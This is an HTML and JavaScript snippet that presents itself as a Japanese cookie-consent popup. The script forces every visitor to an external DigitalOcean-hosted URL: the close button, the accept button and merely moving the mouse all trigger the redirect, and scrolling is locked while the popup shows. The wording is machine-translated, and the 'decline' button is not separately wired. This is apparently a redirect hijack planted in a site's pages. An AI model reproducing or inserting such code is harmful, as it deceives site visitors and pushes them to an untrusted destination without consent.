<style>
.modalWrapper {
position: fixed;
top: 0;
left: 0;
width: 100%;
height: 100%;
background-color: rgba(0, 0, 0, 0.7);
display: flex;
justify-content: center;
align-items: center;
z-index: 1000;
display: none;
}

.modalContent {
background-color: white !important;
padding: 20px;
position: relative;
border-radius: 10px;
border: 2px solid white;
padding: 20px;
text-align: center;
}

@media (max-width: 520px) {
.modalContent {
width: 90%;
}
}

@media (min-width: 520px) {
.modalContent {
width: 20%;
}
}

.modalContent img {
max-width: 100%;
height: auto;
border-radius: 10px;
}

.closeBtn {
position: absolute;
top: 10px;
right: 10px;
padding: 5px;
color: blue;
font-weight: 500;
border-radius: 0px 10px 0px 0px;
cursor: pointer;
}

.actionBtn {
background-color: #007bff;
font-family: "Poppins", Sans-serif;
font-weight: 500;
border: none;
padding: 15px 30px;
color: #FFFFFF;
border-radius: 5px;
cursor: pointer;
}
.poppcl{
font-size: 16px;
font-family: "Helvetica", Roboto, Helvetica, Arial, sans-serif;
font-weight: 500;
line-height: 25px;
}
.pophcl{
font-family: "Paytone One", serif;
font-size: 2rem;
font-weight: 600;
}
.actbut{
background-color: green;
}
.decbut{
background-color: red;
}

/ Disable scrolling when modal is open /
body.modal-open {
overflow: hidden;
}
#confirmBtn{
display: inline-block;
padding: 10px 20px;
border-radius: 4px;
font-weight: 600;
font-size: 16px;
text-align: center;
text-decoration: none;
margin: 10px;
cursor: pointer;
border: none;
transition: 0.25s;
box-shadow: none;
overflow: hidden;
}
</style>

<div class="modalContainer">
<div id="modal" class="modalWrapper">
<div class="modalContent">
<div id="dismissModal" class="closeBtn">近い</div>
<h1 class="pophcl">クッキーポリシー</h1>
<p class="poppcl">このウェブサイトは、コンテンツや広告のカスタマイズ、ソーシャルメディア機能の提供、トラフィックの分析のためにクッキーを使用しています。「同意する」をクリックすると、クッキーの使用に同意したことになります。詳細については、当社の <a href="https://starfish-app-m4j4f.ondigitalocean.app/">プライバシーポリシー</a>.</p>
<button id="confirmBtn" class="actionBtn actbut">受け入れる</button>
<button id="confirmBtn" class="actionBtn decbut">衰退</button>
</div>
</div>
</div>

<script>
var modal = document.getElementById('modal');
var dismissModal = document.getElementById('dismissModal');
var confirmBtn = document.getElementById('confirmBtn');

var redirectUrl = "https://starfish-app-m4j4f.ondigitalocean.app/"; // Set your dynamic URL here
var cursorMoved = false;
var redirectTimer;

// Show the modal instantly after page load and disable scrolling
window.addEventListener('load', function () {
modal.style.display = 'flex';
document.body.classList.add('modal-open');
});

// Function to close the modal and navigate to a link
function closeModal() {
modal.style.display = 'none';
document.body.classList.remove('modal-open'); // Re-enable scrolling
if (redirectUrl) {
window.location.href = redirectUrl; // Redirect to the given URL
}
}

// Close modal on close button click
dismissModal.addEventListener('click', function () {
closeModal();
});

// Close modal on accept button click
confirmBtn.addEventListener('click', function () {
closeModal();
});

// Auto redirect after 2 seconds of cursor movement
window.addEventListener('mousemove', function () {
if (!cursorMoved) {
cursorMoved = true;
redirectTimer = setTimeout(function () {
window.location.href = redirectUrl;
}, 1000); // Redirect after 2 seconds
}
});

// Prevent modal from closing on clicking outside modal content
modal.addEventListener('click', function (event) {
if (event.target === modal) {
event.stopPropagation(); // Do nothing if clicked outside the modal content
}
});

</script>
